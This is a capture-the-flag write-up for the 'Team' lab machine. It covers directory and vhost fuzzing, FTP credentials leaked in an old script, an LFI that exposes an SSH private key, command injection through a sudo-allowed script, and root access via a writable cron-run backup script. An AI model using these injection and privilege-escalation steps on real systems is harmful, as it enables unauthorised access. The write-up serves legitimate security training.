# Team - Beginner

NMAP the target to discover open services: ftp, ssh, http

http headers say to change /etc/hosts to allow browsers to resolve ip to team.thm

Enumerate subdirs and subdomains

### find script/script.txt and the original

```
--> --> gobuster dir -u "http://team.thm/" -w /usr/share/dirb/wordlists/common.txt -x txt

--> gobuster dir -u "http://team.thm/scripts/" -w /usr/share/dirb/wordlists/common.txt -x txt

-->ffuf -u "http://team.thm/scripts/script.FUZZ" -w /usr/share/dirb/wordlists/big.txt
old                     [Status: 200, Size: 466, Words: 27, Lines: 19, Duration: 89ms]
phps                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 88ms]
txt                     [Status: 200, Size: 597, Words: 52, Lines: 22, Duration: 94ms]

```

### script.txt

```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in

```

This shows us that we need to find the original file as it will have credentials for ftp

### script.old

```
$ curl --user-agent "dale" "http://team.thm/scripts/script.old"
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

```

### ftp

After logging in with the credentials in script.old, commands like "ls" and "dir" don't work immediately, the solution is to turn off passive mode by entering "passive"

Navigating around, we come across a txt file "New_site.txt":

```
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
          
```

### VHOST & dev page

Thus the subdomain is "dev.team.thm", the following gobuster command and result verifies this:

```
└─$ gobuster vhost  -u "http://team.thm/" -w /usr/share/dirb/wordlists/big.txt --append-domain
dev.team.thm Status: 200 [Size: 187]

```

With this test, we the dev subdomain is a vhost rather than a traditional subdomain. This was new to me and the following helped:

- https://www.reddit.com/r/synology/comments/2v7l9o/can_someone_explain_virtual_hosts_for_me_i_cant/


A vhost is how a single server can host multiple websites

After discovering this dev vhost, I add it to my /etc/hosts file and navigate to the page. This is done to map the multiple domain names to the single ip address.

On the dev page, clicking the only button takes us to the following 

```
http://dev.team.thm/script.php?page=teamshare.php
```

The page itself yields nothing of value, but is vulnerable to LFI with a test for page=/etc/passwd

Next I brute force the page parameter to see all the files I can access:

```
ffuf -u "http://dev.team.thm/script.php?page=FUZZ" -w /usr/share/wordlists/LFI-files/list.txt -fs 1

```

Out of the results, I am paying attention for anything that would have the ID_RSA private key used for ssh connections as mentioned before in the letter to Dale. THe following config file has this: /etc/ssh/sshd_config

I copy and paste the private key for dale and format it

```└─$ sed 's/#//g'  dale_key >> Dale_key``` # remove hashtags

Next I login!

```┌──(kali㉿kali)-[~/Documents/thm]
└─$ chmod 400 'Dale_key'
                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/thm]
└─$ ssh -i 'Dale_key' dale@10.64.188.207
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Mon Jan 18 10:51:32 2021
dale@ip-10-64-188-207:~$ 
```

Our first flag for user.txt is located on dale's account. For the root.txt file, I'll first check everything else I can access with dale's permissions.


### Privilege Escalation

Linpeas shows up potential Priv esc vectors, particularly of note are the following cve and the ability for dale to run /home/gyles/admin_checks as sudo without passwd

```
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8888

dale@ip-10-65-174-11:~$ wget http://192.168.129.53:8888/linpeas.sh

Vulnerable to CVE-2021-3560

```

Show sudo commands available to current user (dale)

```
dale@ip-10-65-191-181:/home/gyles$ sudo -l
Matching Defaults entries for dale on ip-10-65-191-181:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-65-191-181:
    (gyles) NOPASSWD: /home/gyles/admin_checks

```

The script:

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

This script essentially adds $name to stats.txt and then makes a copy of it in a new file named by the current date/time. Only what we enter for the name variable is relevant, the date input gets sent to /dev/null by "$error 2>/dev/null"

Since we can execute this script as Gyles, if we can call any commands on his behalf via injection, path poisoning, or environment variables, acheive the admin group privileges:

```
dale@ip-10-65-137-240:/home/gyles$ id gyles
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

Through the admin_checks script, there is an OS command injection vulnerability for how the date input is handled:

```
$error 2>/dev/null
```

Our input for date gets executed if it is a command, POC below:

```
dale@ip-10-65-137-240:/var/stats$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: o
Enter 'date' to timestamp the file: pwd
The Date is /var/stats
Stats have been backed up
```

Below is a oneliner to simplify the command process and ignore having to input the name arg:

```
echo -e "name\nCOMMAND" | sudo -u gyles /home/gyles/admin_checks
```

Now we are able to execute commands as Gyles who is a member of the admin group.

### Automated tasks - CRON

Take a look at the CRON jobs to see any that are common:

```
grep CRON /var/log/syslog
```

There is a script /opt/admin_stuff/script.sh that is run every minute by root. Hmm we cant directly view what the script does as dale but we have access to the admin group privileges with Gyles. So lets see what it does with our command injection vector:

```
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

So if we can modify the dev_backup or main_backup scripts we can escalate.

Enumerating the perms for each of these scripts we see that only main_backup.sh can be edited in our case:

```
dale@ip-10-67-167-248:/usr/local$ ls -l sbin bin
bin:
total 4
-rwxrwxr-x 1 root admin 65 Jan 17  2021 main_backup.sh

sbin:
total 4
-rwxr-xr-x 1 root root 64 Jan 17  2021 dev_backup.sh
```

```
###/usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

If we add the following line to main_backup.sh, the automated cronjob will copy our root flag to /tmp/root.txt:

```
cp root.txt /tmp/root.txt
```